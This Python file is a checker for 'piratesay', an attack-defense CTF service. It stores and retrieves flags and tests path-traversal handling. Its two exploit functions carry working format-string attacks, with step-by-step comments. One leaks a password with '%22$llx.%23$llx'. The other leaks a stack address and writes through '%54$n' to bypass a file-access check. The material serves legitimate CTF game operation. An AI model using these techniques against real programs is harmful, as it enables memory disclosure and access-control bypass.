import asyncio
import random
import re
import string
import time
from asyncio import StreamReader, StreamWriter
from datetime import datetime, timedelta
from logging import LoggerAdapter
from typing import Optional

import faker
import generate_content
from enochecker3 import (AsyncSocket, BaseCheckerTaskMessage, ChainDB,
                         Enochecker, ExploitCheckerTaskMessage, FlagSearcher,
                         GetflagCheckerTaskMessage, GetnoiseCheckerTaskMessage,
                         HavocCheckerTaskMessage, InternalErrorException,
                         MumbleException, OfflineException,
                         PutflagCheckerTaskMessage, PutnoiseCheckerTaskMessage)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 4444
checker = Enochecker("piratesay", SERVICE_PORT)
app = lambda: checker.app

# List of pirate-themed directory names
directories = [
    "BlackbeardCove",
    "TreasureIsland",
    "SkullAndBonesReef",
    "DeadMansBay",
    "JollyRogersHarbor",
    "BuccaneerBeach",
    "PirateHideout",
    "CutthroatCreek",
    "SirenShores",
    "CorsairCastle",
    "WickedWaters",
    "MaroonersLagoon",
    "ParrotPerch",
    "RumRunnersRidge",
    "GalleonGraveyard"
]

def get_random_dir_locally():
    return random.choice(directories)

"""
Utility functions
"""

class Connection:
    def __init__(self, socket: AsyncSocket, logger: LoggerAdapter):
        self.reader, self.writer = socket[0], socket[1]
        self.logger = logger

    async def create_log(self, directory: str, filename: str, message: str, timestamp: str):
        self.logger.debug(
            f"Sending command to create log: {filename} in directory {directory} with message: {message}"
        )
        # Go to the directory
        self.writer.write(f"sail {directory}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b"$ ")
        # Create the file
        self.writer.write(f"bury {filename}\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write timestamp
        self.writer.write(f"{timestamp}\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write blank password
        self.writer.write(f"\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write blank to reject storing as .private
        self.writer.write(f"\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write message
        self.writer.write(f"{message}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b"$ ")

        if not b"Burried at" in data:
            raise MumbleException("Failed to create log file")
        
    async def create_treasure(self, directory: str, filename: str, password: str, message: str, flag: str, timestamp: str):
        self.logger.debug(
            f"Sending command to create treasure: {filename} in directory {directory} with message: {message}"
        )
        # Go to the directory
        self.writer.write(f"sail {directory}\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b"$ ")
        # Create the file
        self.writer.write(f"bury {filename} {flag}\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write timestamp
        self.writer.write(f"{timestamp}\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write password
        self.writer.write(f"{password}\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write message
        self.writer.write(f"{message}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b"$ ")

        if not b"Burried at" in data:
            raise MumbleException("Failed to create treasure file")
    

    async def create_private(self, directory: str, filename: str, message: str, flag: str, timestamp: str):
        self.logger.debug(
            f"Sending command to create private: {filename} in directory {directory} with message: {message}"
        )
        # Go to the directory
        self.writer.write(f"sail {directory}\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b"$ ")
        # Create the file
        self.writer.write(f"bury {filename} {flag}\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write timestamp
        self.writer.write(f"{timestamp}\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write blank password
        self.writer.write(f"\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write "y" to store as .private
        self.writer.write(f"y\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b": ")
        # Write message
        self.writer.write(f"{message}\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b"$ ")

        if not b"Burried at" in data:
            raise MumbleException("Failed to create private file")
    
    async def get_identity(self):
        self.writer.write(f"identity\n".encode())
        await self.writer.drain()
        data = await self.reader.readuntil(b": ")
        # Send blank, so as not to change it
        self.writer.write(f"\n".encode())
        await self.writer.drain()
        await self.reader.readuntil(b"$ ")

        identity = data.decode().split("Pirate Identity: ")[1].split("\n")[0]
        return identity



@checker.register_dependency
def _get_connection(socket: AsyncSocket, logger: LoggerAdapter) -> Connection:
    return Connection(socket, logger)


"""
CHECKER FUNCTIONS
"""

# Check that traversal works as expected
@checker.havoc(0)
async def havoc_traversal(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):

    await conn.reader.readuntil(b"$ ")
    # 1. Try to navigate out of the root directory
    conn.writer.write(b"sail ..\n")
    await conn.writer.drain()
    data = await conn.reader.readuntil(b"$ ")

    if not b"You cannot sail beyond the seven seas (root directory)" in data:
        raise MumbleException("Navigating out of the root directory is possible")
    

    # 2. Try to navigate to another directory within the root directory
    dir1 = get_random_dir_locally()
    dir2 = get_random_dir_locally()
    # Sail to a directory
    conn.writer.write(f"sail {dir1}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")
    # Try to navigate to other internal folder
    conn.writer.write(f"sail ../{dir2}\n".encode())
    await conn.writer.drain()
    data = await conn.reader.readuntil(b"$ ")
    # Data should now include dir2
    if not f"{dir2}".encode() in data:
        raise MumbleException("Navigating to other directories within the root directory is not possible")
    
    # 3. Try to navigate to a non-existent directory
    conn.writer.write(f"sail ../nonexistent\n".encode())
    await conn.writer.drain()
    data = await conn.reader.readuntil(b"$ ")
    if not b"Path does not exist or is not accessible." in data:
        raise MumbleException("Navigating to a non-existent directory is possible")

# Check that file creation works as expected
@checker.havoc(1)
async def havoc_file_creation(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
    await conn.reader.readuntil(b"$ ")
    # 1. Try to create a file in the root directory
    conn.writer.write(b"bury root_file\n")
    await conn.writer.drain()
    data = await conn.reader.readuntil(b"$ ")
    if b"Can't bury treasure at sea" not in data:
        raise MumbleException("Creating files in the root directory is possible")

    # 2. Try to create a file in another directory
    dir_1 = get_random_dir_locally()
    dir_2 = get_random_dir_locally()
    conn.writer.write(f"sail {dir_1}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")
    conn.writer.write(f"bury ../{dir_2}/test_file\n".encode())
    await conn.writer.drain()
    data = await conn.reader.readuntil(b"$ ")

    if b"Can only bury treasure where your ship is" not in data:
        raise MumbleException("Path traversal is possible when creating files")

@checker.putnoise(0)
async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):

    # Extract name from last line of welcome message
    welcome = await conn.reader.readuntil(b"$ ")
    scammer_name = welcome.decode().split("\n")[-1].split(":/")[0]
    # split with _ instead of uppercase
    scammer_name = re.sub(r'(?<=[a-z])(?=[A-Z])', '_', scammer_name).lower()

    # Get a random directory
    directory = get_random_dir_locally()

    filename, message, timestamp = generate_content.generate_noise_entries(directory, scammer_name)

    logger.debug(f"Generated noise: {directory}/{filename} with message {message}")

    # Await create_log
    await conn.create_log(directory, filename, message, timestamp)

    # Save as an entry in the db for getnoise() to use later.
    await db.set("noisedata", (directory, filename, message))

@checker.getnoise(0)
async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
    
    try:
        directory, filename, message = await db.get("noisedata")
    except KeyError:
        raise MumbleException(f"Missing database entry from putnoise")

    logger.debug(f"File info: {directory}/{filename}. Looking for message {message}")
    await conn.reader.readuntil(b"$ ")

    # Go to the directory
    conn.writer.write(f"sail {directory}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # Open the file
    conn.writer.write(f"loot {filename}.log\n".encode())
    await conn.writer.drain()
    content = await conn.reader.readuntil(b"$ ")

    # Check if the flag is in the file
    if not f"{message}".encode() in content:
        raise MumbleException(f"Couldn't find the given message in {directory}/{filename}")


@checker.putflag(0)
async def putflag_treasure(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    conn: Connection,
    logger: LoggerAdapter,    
) -> None:
    
    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=16)
    )

    # Log a message before any critical action that could raise an error.
    welcome = await conn.reader.readuntil(b"$ ")

    # Extract name from last line of welcome message
    name = welcome.decode().split("\n")[-1].split(":/")[0]
    # split with _ instead of uppercase
    name = re.sub(r'(?<=[a-z])(?=[A-Z])', '_', name).lower()

    # Get a random time as (YYYY-MM-DD HH:MM)
    # Define the start and end dates
    start_date = datetime(2014, 1, 1)
    end_date = datetime.now()

    # Generate a random time between the start and end dates
    random_time = start_date + timedelta(days=random.randint(0, (end_date - start_date).days),
                                        hours=random.randint(0, 23),
                                        minutes=random.randint(0, 59))
    # convert to string with format YYYY-MM-DD HH:MM
    random_time = random_time.strftime("%Y-%m-%d %H:%M")
    filename = f"{name}_found_shipwreck_{random_time.replace(' ', '_').replace(':', '')}"

    # Get a random directory
    directory = get_random_dir_locally()

    message = f"""Ahoy mateys! I stumbled upon {directory} and 
    discovered a shipwreck full of treasure and rum! I scavanged it all, 
    except for the ship's old flag. It seemed useless, so I'll leave it for 
    whoever comes next. Yo-ho-ho and away we go!"""

    # Await create_treasure
    await conn.create_treasure(directory, filename, password, message, task.flag, random_time)

    # Save as an entry in the db for getflag() to use later.
    await db.set("treasuredata", (directory, filename, password))

    # Exit
    conn.writer.write(f"dock".encode())
    await conn.writer.drain()

    # Store the file in attack_info
    return f"{directory}/{filename}.treasure"

@checker.getflag(0)
async def getflag_treasure(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
) -> None:
    
    logger.debug("Getting flag: " + task.flag)
    try:
        directory, filename, password = await db.get("treasuredata")
    except KeyError:
        raise MumbleException(f"Missing database entry from putflag")

    logger.debug(f"Looking for flag in treasure file {directory}/{filename}.")
    await conn.reader.readuntil(b"$ ")

    # Go to the directory
    conn.writer.write(f"sail {directory}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # Open the file
    conn.writer.write(f"loot {filename}.treasure\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")

    # Enter the password
    conn.writer.write(f"{password}\n".encode())
    await conn.writer.drain()
    data = await conn.reader.readuntil(b"$ ")

    # Check if the flag is in the file
    if not f"{task.flag}".encode() in data:
            raise MumbleException(f"Couldn't find the given flag in {directory}/{filename}")

    # Exit!
    conn.writer.write(f"dock\n".encode())
    await conn.writer.drain()


@checker.exploit(0)
async def exploit_treasure(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:

    logger.debug(f"Exploiting: {task.attack_info}" )

    if not task.attack_info:
        raise MumbleException("No attack info provided")

    treasure_dir, treasure_file = task.attack_info.split('/')
    
    await conn.reader.readuntil(b"$ ")
    
    # Go to the directory
    conn.writer.write(f'sail {treasure_dir}\n'.encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # Try to plunder the file
    conn.writer.write(f'loot {treasure_file}\n'.encode())
    await conn.writer.drain()
    
    # Handle the output and wait for the password prompt
    await conn.reader.readuntil(b": ")

    # Send the format string exploit as the password
    conn.writer.write(b'%22$llx.%23$llx\n') # TODO: %31$llx.%32$llx locally, find out why?
    await conn.writer.drain()

    # Read the buffer to get the incorrect password message
    incorrect_message = (await conn.reader.readuntil(b"$ ")).decode()

    # Extract the two addresses from the incorrect message
    address1_hex, address2_hex = incorrect_message.split(' ')[0].split('.')

    # Convert the addresses to ASCII and reverse them
    address1 = bytes.fromhex(address1_hex).decode()[::-1]
    address2 = bytes.fromhex(address2_hex).decode()[::-1]

    # Print the password
    password = f'{address1}{address2}'

    # Now try to plunder the file again
    conn.writer.write(f'loot {treasure_file}\n'.encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")

    conn.writer.write(f'{password}\n'.encode())
    await conn.writer.drain()
    
    # Check for the flag in the result
    result = await conn.reader.readuntil(b"$ ")
    if flag := searcher.search_flag(result):
        return flag

    raise MumbleException(f"flag not found during treasure exploit")
    

@checker.putflag(1)
async def putflag_private(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    conn: Connection,
    logger: LoggerAdapter,    
) -> None:

    # Log a message before any critical action that could raise an error.
    welcome = await conn.reader.readuntil(b"$ ")

    # Extract name from last line of welcome message
    name = welcome.decode().split("\n")[-1].split(":/")[0]
    # split with _ instead of uppercase
    name = re.sub(r'(?<=[a-z])(?=[A-Z])', '_', name).lower()

    # Get a random time as (YYYY-MM-DD HH:MM)
    # Define the start and end dates
    start_date = datetime(2014, 1, 1)
    end_date = datetime.now()

    # Generate a random time between the start and end dates
    random_time = start_date + timedelta(days=random.randint(0, (end_date - start_date).days),
                                        hours=random.randint(0, 23),
                                        minutes=random.randint(0, 59))
    # convert to string with format YYYY-MM-DD HH:MM
    random_time = random_time.strftime("%Y-%m-%d %H:%M")
    filename = f"{name}_found_shipwreck_{random_time.replace(' ', '_').replace(':', '')}"

    # Get a random directory
    directory = get_random_dir_locally()

    message = f"""Ahoy mateys! I stumbled upon {directory} and 
    discovered a shipwreck full of treasure and rum! I scavanged it all, 
    except for the ship's old flag. It seemed useless, so I'll leave it for 
    whoever comes next. Yo-ho-ho and away we go!"""

    # Await get_identity
    identity = await conn.get_identity()

    # Await create_treasure
    await conn.create_private(directory, filename, message, task.flag, random_time)

    # Save as an entry in the db for getflag() to use later.
    await db.set("privatedata", (directory, filename, identity))

    # Exit
    conn.writer.write(f"dock".encode())
    await conn.writer.drain()

    # Store the file in attack_info
    return f"{directory}/{filename}.private"

@checker.getflag(1)
async def getflag_private(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
) -> None:
    
    logger.debug("Getting flag: " + task.flag)
    try:
        directory, filename, identity = await db.get("privatedata")
    except KeyError:
        raise MumbleException(f"Missing database entry from putflag")

    logger.debug(f"Looking for flag in private file {directory}/{filename}.")
    await conn.reader.readuntil(b"$ ")

    # Set identity to the one we got from the database
    conn.writer.write(f"identity\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")
    conn.writer.write(f"{identity}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # Go to the directory
    conn.writer.write(f"sail {directory}\n".encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # Open the file
    conn.writer.write(f"loot {filename}.private\n".encode())
    await conn.writer.drain()
    data = await conn.reader.readuntil(b"$ ")

    # Check if the flag is in the file
    if not f"{task.flag}".encode() in data:
            raise MumbleException(f"Couldn't find the given flag in {directory}/{filename}")

    # Exit!
    conn.writer.write(f"dock\n".encode())
    await conn.writer.drain()


# Relative positions on the stack from the stack dump for 2nd exploit (will be the same regardless of ASLR)
reference_variable_pos = 0x3150
access_variable_pos = 0x192c

@checker.exploit(1)
async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:

    logger.debug(f"Exploiting: {task.attack_info}" )

    if not task.attack_info:
        raise MumbleException("No attack info provided")

    private_dir, private_file = task.attack_info.split('/')
    
    await conn.reader.readuntil(b"$ ")
    
    # 1. Navigate to the directory
    conn.writer.write(f'sail {private_dir}\n'.encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # 2. Set identity and loot to get the address of the access variable

    # Recall that the address space is randomized for each run of the program due to ASLR, but relative positions are the same
    # The stack dump shows that the variable at %1575$ stores the address to a nearby position on the stack
    # We can see that this address is at +0x3150 from the stack pointer $sp
    # We also see that the address storing the access variable is at +0x192c
    # We can use this information to calculate the address of the access variable
    # To ensure the string is 64 bytes long, we can pad it with 'a's
    # We also wrap the pointer in = to make it easier to extract from the response
    conn.writer.write(f'identity\n'.encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")
    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=%1575$p='
    conn.writer.write(new_identity + b'\n')
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # Send command to loot file
    conn.writer.write(f'loot {private_file}\n'.encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")
    conn.writer.write(b'\n')    # Send empty password, as we don't have the address yet
    await conn.writer.drain()
    response = await conn.reader.readuntil(b"$ ")
    response = response.decode()
    
    # Get reference variable address
    reference_variable_address = response.split('=')[1].strip()

    # Calculate the address of the access variable using relative positions in hex
    reference_variable_address = int(reference_variable_address, 16)
    access_variable_address = reference_variable_address - reference_variable_pos + access_variable_pos
    logger.debug(f"Access variable address: {hex(access_variable_address)}")

    # 3. Set identity and loot to write a truthy value to the access variable

    # We will this time input the address of the access variable when prompted for a password during the loot command
    # From the stack dump we can deduce that input at this prompt is stored at %54$
    # Now that we know the address of the access variable will be stored at %54$ we can use %n
    # %54$n will take the count of the characters in front of it and write this value to the address stored at %54$
    # Voila! We have written a truthy value to the access variable
    conn.writer.write(f'identity\n'.encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")
    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%54$n'
    conn.writer.write(new_identity + b'\n')
    await conn.writer.drain()
    await conn.reader.readuntil(b"$ ")

    # Send command to loot file
    conn.writer.write(f'loot {private_file}\n'.encode())
    await conn.writer.drain()
    await conn.reader.readuntil(b": ")
    # Send the raw byte representation of the access variable address
    conn.writer.write(access_variable_address.to_bytes(8, 'little') + b'\n')
    await conn.writer.drain()

    # Check for the flag in the result
    result = await conn.reader.readuntil(b"$ ")
    if flag := searcher.search_flag(result):
        return flag

    raise MumbleException(f"flag not found during private exploit")

if __name__ == "__main__":
    checker.run()